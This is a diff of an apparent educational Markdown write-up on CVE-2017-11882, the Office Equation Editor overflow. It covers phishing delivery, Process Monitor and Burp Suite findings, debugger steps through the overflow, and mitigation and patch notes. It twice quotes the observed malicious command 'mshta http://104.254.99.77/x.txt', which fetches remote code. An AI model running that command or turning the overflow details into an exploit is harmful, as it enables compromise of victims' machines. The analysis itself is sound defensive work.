@@ -15,7 +15,7 @@
   * The score is 7.8 (high)
   * Really dangerous & should be fixed ASAP  
 ![CVSS](https://github.com/tingsama/hacking-p2/blob/main/CVSS.png)  
-Figure 1:  CVSS score [1]
+<p align="center"> Figure 1:  CVSS score [1] </p>  
 
 
 ### It always starts from the internet phishing...
@@ -24,23 +24,26 @@ Figure 1:  CVSS score [1]
 3.	A __.doc file__ in Rich Text Format (RTF)
 4.	__Microsoft Office__ will automatically open it  
 ![Spam Email](https://github.com/tingsama/hacking-p2/blob/main/Spam%20Email.png)
+<p align="center"> Figure 2:  Spam Email [2] </p>  
 
 
 ### Process Monitor
 It is an [advanced monitoring tool for Windows](https://nvd.nist.gov/vuln-metrics/cvss).  
-It is used to monitor and display all the activities of file system in real-time. [1](https://en.wikipedia.org/wiki/Process_Monitor)  
+[It is used to monitor and display all the activities of file system in real-time.](https://en.wikipedia.org/wiki/Process_Monitor)  
 * Unexpected operation named 'EQNEDT32.EXE'
 * Command line has been called
 * (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
 ![Process Monitor](https://github.com/tingsama/hacking-p2/blob/main/Process%20Monitor.png)  
+<p align="center"> Figure 3:  Processes List [3] </p>  
 
 
 ### Burp Suite
 It is a [web vulnerability scanner](https://portswigger.net/burp).  
-It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
+[It is a set of tools used for penetration testing of web applications.](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
 * Unexpected 'GET' request 
 * (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
 ![Burp Suite](https://github.com/tingsama/hacking-p2/blob/main/Burp%20Suite.png)  
+<p align="center"> Figure 4:  Get request [3] </p>  
 
 
 ### Steps after you click the malicious word file:
@@ -56,24 +59,29 @@ In this case, everything inside the equation editor can skip all Microsoft prote
 Before overflow EAX save the length of font name which is 16 bytes (Hex:00000010).  
 And the detail inside the font name registers is “TIMES NEW ROMAN”.  
 ![step 3-1](https://github.com/tingsama/hacking-p2/blob/main/step%203-1.png)  
+<p align="center"> Figure 5:  Debuger screenshot 1 [3] </p>  
 After overflow, EAX pointed to 0012F350 and overflowed all other registers.  
 On memory 004115CF, it loads whatever is inside the ebp register and pushes into the EAX register.  
 The ebp register is a two way pointer and linking between word document and equation editor.  
 The hacker changed the ebp register value to 48 bytes and then it was loaded to the EAX register.  
 ![step 3-2](https://github.com/tingsama/hacking-p2/blob/main/step%203-2.png)  
+<p align="center"> Figure 6:  Debuger screenshot 2  [3] </p>  
 #### 4. Overflow message  
 Let now take a look at the 48 bytes detail inside the overflowed register beginning at address: 0012F350.  
 From address 0012F350 to 0012F360 32 bytes are saving the hacker's mshta link and it can send a get request to this link and download the malicious software.  
 Address: 0012F370 first 12 bytes are ‘20’ which are saving shell code inside but we cannot see it in detail through ASCii reader.   
 The final 4 bytes are ‘12 0C 43 00’ which is the new EIP register address that the hacker wants us to jump to in the next step.  
 ![step 4](https://github.com/tingsama/hacking-p2/blob/main/step%204.png)  
+<p align="center"> Figure 7:  Debuger screenshot 3 [3] </p>  
 #### 5. Redirect to new EIP address  
 Here we can see at address: 00430C12 it call the Winexe program.  
 ![step 5](https://github.com/tingsama/hacking-p2/blob/main/step%205.png)  
+<p align="center"> Figure 8: Debuger screenshot 4 [3] </p>  
 #### 6. Winexe execute   
 From the code here we can see the Winexe execute at address 00430C12 and talk to the EAX register as it input.  
 In this case, inside the Winexe it will run shell code first, then send a get request to the hacker's link.  
 ![step 6](https://github.com/tingsama/hacking-p2/blob/main/step%206.png)  
+<p align="center"> Figure 9: Debuger screenshot 5 [3] </p>  
 #### 7. Download hacker’s malicious software   
 Finally after everything executes and runs correctly, it will download the malicious software and hide in some specific hard finding place to continuously steal your personal information.  
 
@@ -84,6 +92,7 @@ However, if you decide not to patch, a simple way to protect your machine is to 
 The following commands can update your registry to disable EQUAEDT32.exe.
 If you have an Office software running on a x64 machine, then you can use the second command, otherwise the first command is your choice. [4]
 ![Update Registry](https://github.com/tingsama/hacking-p2/blob/main/Update%20Registry.png)  
+<p align="center"> Figure 10: Update registry [4] </p>  
 
 
 ### [Official Patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
@@ -92,6 +101,7 @@ The difference of the patched function(left hand side) and the original function
 The left top block shows that a boundary check is added. This line of code reset the counter register to 0x20 if it is larger than or equal to 0x21.
 The left bottom block added a buffer truncation. This code makes sure only 0x20 bytes are copied and zero-terminate. [5]
 ![Official Patc](https://github.com/tingsama/hacking-p2/blob/main/Official%20Patch.png)  
+<p align="center"> Figure 11: Official Patch [5] </p>  
 
 
 ### How to avoid?
